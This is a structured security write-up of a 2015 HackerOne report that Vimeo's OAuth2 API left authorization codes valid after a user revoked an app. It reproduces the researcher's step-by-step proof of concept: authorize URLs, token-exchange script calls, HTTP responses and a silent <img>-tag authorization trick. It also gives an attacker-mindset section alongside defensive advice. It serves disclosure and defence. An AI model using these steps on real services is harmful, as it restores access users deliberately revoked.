# OAuth2 Authorization Code Not Invalidated During Access Revocation - Vimeo API

## Metadata
- **Source:** HackerOne
- **Report:** 57603 | https://hackerone.com/reports/57603
- **Submitted:** 2015-04-21
- **Reporter:** dor1s
- **Program:** Vimeo
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Authorization Bypass, OAuth2 Implementation Flaw, Token Management Vulnerability, Insufficient Token Revocation
- **CVEs:** None
- **Category:** auth-crypto

## Summary
Vimeo's OAuth2 implementation fails to invalidate authorization codes when users revoke application access, allowing malicious applications to obtain new access tokens even after revocation. An attacker can exchange a previously obtained authorization code for a fresh access token, effectively restoring unauthorized access to a user's account.

## Attack scenario
1. Attacker creates a malicious OAuth2 application and tricks user into authorizing it, obtaining an authorization code
2. Attacker exchanges the authorization code for an access token and confirms working access to user's account
3. User discovers the malicious application and revokes access through account security settings, invalidating the current access token
4. Attacker uses the old authorization code (obtained in step 1) to exchange for a new access token via the token endpoint
5. New access token is successfully generated and attacker regains unauthorized access to user's account
6. User is unaware access has been restored without re-authorization, believing revocation was effective

## Root cause
Vimeo's OAuth2 token revocation logic only invalidates active access tokens but does not mark authorization codes as consumed or revoked. Authorization codes should be single-use tokens invalidated immediately after exchange or when user revokes application access.

## Attacker mindset
Develop a seemingly legitimate application to gain user authorization. After gaining access, if detected and revoked, use the retained authorization code to silently regain access without user knowledge or re-authorization, particularly leveraging auto-approval flows if available.

## Defensive takeaways
- Implement mandatory single-use enforcement for OAuth2 authorization codes with database tracking of redeemed codes
- Invalidate all authorization codes issued to an application when user revokes access
- Implement authorization code expiration (typically 10 minutes) to limit window for malicious reuse
- Add revocation listeners that cascade invalidation across all related tokens (codes, access tokens, refresh tokens)
- Maintain audit logs of code generation, redemption, and revocation for forensic analysis
- Consider implementing token binding or state validation to prevent code reuse in different contexts
- Implement rate limiting on token endpoint to detect suspicious code exchange patterns

## Variant hunting
Check if refresh tokens are also retained and usable after access revocation
Test whether authorization codes can be reused multiple times with different client secrets
Verify if authorization codes from revoked applications can be transferred between attacker-controlled apps
Examine if authorization code parameters (scope, redirect_uri) can be modified during redemption
Test implicit flow tokens and device flow codes for similar revocation bypass issues
Check if revoking at user level vs application level has different code invalidation behavior
Verify authorization code behavior across different OAuth2 grant types (authorization code, client credentials, etc.)

## MITRE ATT&CK
- T1190
- T1550.001
- T1528

## Notes
This vulnerability was discovered in 2015 and demonstrates a fundamental OAuth2 implementation flaw. The researcher provided clear reproducible steps showing authorization codes remain valid after revocation. The PoC demonstrates step-by-step how a user revoking access becomes unaware that attacker regains access through code exchange. The vulnerability could be weaponized at scale if attacker-controlled applications could silently re-authorize using approval_prompt=auto parameter mentioned in the report.

## Full report
<details><summary>Expand</summary>

OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all `access_token`s are being revoked and become invalid. But not only `access_token`s should be revoked, authorization `code`s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization `code` during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.

Proof of Concept
==============
*(all scripts used are attached)*

1) Open the link for OAuth2 authorization for some application. Example link for my test application (**Dor1s Test1**, feel free to use my test application to reproduce the issue):
```
https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
```
2) Log into your Vimeo account (if needed) and click **Allow**
3) Copy `code` value from callback url, for example:
```
https://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657
```
`code` value is `e1fa87cd449ae55b74445b31ac79450c14eeb657`
4) Use `code` value to obtain `access_token`:
```
doris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657
{
    "access_token": "d3ac3bb53d1c4ebc3de7d28e4ed801c0",
    "token_type": "bearer",
    "scope": "public private",
    "user": {
        "uri": "/users/39285903",
<... CUT OUT ... >
}
```
5) Check validity of `access_token`:
```
doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0
HTTP/1.1 200 OK
Date: Tue, 21 Apr 2015 14:10:29 GMT
Server: nginx
Content-Type: application/vnd.vimeo.user+json
Cache-Control: no-cache, max-age=315360000
Expires: Fri, 18 Apr 2025 14:10:29 GMT
Content-Length: 2930
Accept-Ranges: bytes
Via: 1.1 varnish
Age: 0
X-Served-By: cache-fra1239-FRA
X-Cache: MISS
X-Cache-Hits: 0
X-Timer: S1429625429.334602,VS0,VE203
Vary: Accept,Vimeo-Client-Id,Accept-Encoding

{
    "uri": "/users/39285903",
< ... CUT OUT ... >
}
```
6) Repeat step 1. Link for my test application:
```
https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
```
7) Repeat step 2. Log into your accounts (if needed) and click **Allow**.
*Note:* it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.

*Note 2:* often OAuth providers allow to use `approval_prompt=auto` parameter, which makes this step does not require user to click **Allow** again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:
```
<html>
	<img src="https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef">
</html>
```

such code will "silently" produce new `access_token` value to callback each time it has been loaded by the user.

8) Copy `code` value from callback url and save it for future usage:
```
https://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9
```
`code` value is `82e24f835184f47cd83f249907e7bd5018bf62c9`

9) Go to account security settings [https://vimeo.com/settings/apps](https://vimeo.com/settings/apps)

10) **Disconnect** the application (**Dor1s Test1** if my test application used) from **Apps** section

11) To ensure that access is denied, repeat step 5:
```
doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0
HTTP/1.1 401 Authorization Required
Date: Tue, 21 Apr 2015 14:23:55 GMT
Server: nginx
Content-Type: application/vnd.vimeo.error+json
Cache-Control: no-cache, max-age=315360000
WWW-Authenticate: Bearer error="invalid_token"
Expires: Fri, 18 Apr 2025 14:23:55 GMT
Content-Length: 53
Accept-Ranges: bytes
Via: 1.1 varnish
X-Served-By: cache-fra1245-FRA
X-Cache: MISS
X-Cache-Hits: 0
X-Timer: S1429626235.146346,VS0,VE105
Vary: Accept,Vimeo-Client-Id,Accept-Encoding

{
    "error": "A valid user token must be passed."
}
```
12) Use `code` value from step 8 and exchange it for `access_token`:
```
doris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9
{
    "access_token": "9eabdc746910ea39c07395ee1b69a2b9",
    "token_type": "bearer",
    "scope": "public private",
    "user": {
        "uri": "/users/39285903",
<... CUT OUT ...>
}
```
13) Check validity of `access_token`:
```
doris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9
HTTP/1.1 200 OK
Date: Tue, 21 Apr 2015 14:25:41 GMT
Server: nginx
Content-Type: application/vnd.vimeo.user+json
Cache-Control: no-cache, max-age=315360000
Expires: Fri, 18 Apr 2025 14:25:41 GMT
Content-Length: 2930
Accept-Ranges: bytes
Via: 1.1 varnish
Age: 0
X-Served-By: cache-fra1235-FRA
X-Cache: MISS
X-Cache-Hits: 0
X-Timer: S1429626341.087757,VS0,VE201
Vary: Accept,Vimeo-Client-Id,Accept-Encoding

{
    "uri": "/users/39285903",
<... CUT OUT ...>
}
```

Impact
======
The vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.

Mitigation
========
For access revocation processing all authorization `code` issued for certain pair of user and application should be invalidated (as it currently being done for `access_token` values).

</details>

---
*Analysed by Claude on 2026-05-24*
